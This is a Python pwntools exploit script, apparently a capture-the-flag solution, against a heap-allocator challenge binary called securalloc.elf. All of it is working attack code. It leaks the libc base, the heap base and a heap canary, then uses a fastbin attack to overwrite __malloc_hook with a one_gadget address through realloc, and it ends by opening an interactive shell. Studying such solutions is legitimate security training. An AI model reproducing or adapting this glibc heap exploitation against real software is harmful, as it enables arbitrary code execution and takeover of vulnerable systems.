from pwn import *
from one_gadget import generate_one_gadget

r = process("./securalloc.elf", aslr=1)
l = ELF("./libc.so.6", checksec=False)
#gdb.attach(r, "b *$rebase(0xB47)")
#gdb.attach(r)

def create(r, l):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Size: ", l.__str__())

def edit(r, c):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Data: ", c)

def show(r):
    r.sendlineafter("> ", "3")
    r.recvuntil("Data: ")

def free(r):
    r.sendlineafter("> ", "4")

path_to_libc = 'libc.so.6'
ogt = []
for offset in generate_one_gadget(path_to_libc):
    ogt.append(offset)

log.info("Stage 1 > Leaking libc_base addr, heap_base addr, and heap_canary value")
create(r, 0x40)
create(r, 0x8)
show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
l.address = u64(leak)-0x3c5540

create(r, 0x8)
show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
heap_base = u64(leak)-0xf0

for i in range(7):
    create(r, 0x20)
create(r, 0x8)

show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
canary = u64(leak) & 0xffffffffffffff00
log.success("        > libc_base: {}, heap_base: {}, heap_canary: {}".format(hex(l.address), hex(heap_base), hex(canary)))

log.info("Stage 2 > Fastbin attack")
create(r, 0x10)
free(r)
create(r, 0x50)
free(r)
create(r, 0x10)
malloc_hook = l.symbols["__malloc_hook"]
realloc = l.symbols["__libc_realloc"]
one = l.address + ogt[0]
ploadx = p64(0)*2 + p64(canary) + p64(0) + p64(0x71) + p64(malloc_hook - 0x23)
edit(r, ploadx)
create(r, 0x50)
create(r, 0x50)
ploady = "\x00"*3 + p64(one) + p64(realloc+16)
edit(r, ploady)

log.info("Stage 3 > Triggering RCE")
create(r, 0x0)

log.success("Pwned!")
r.interactive()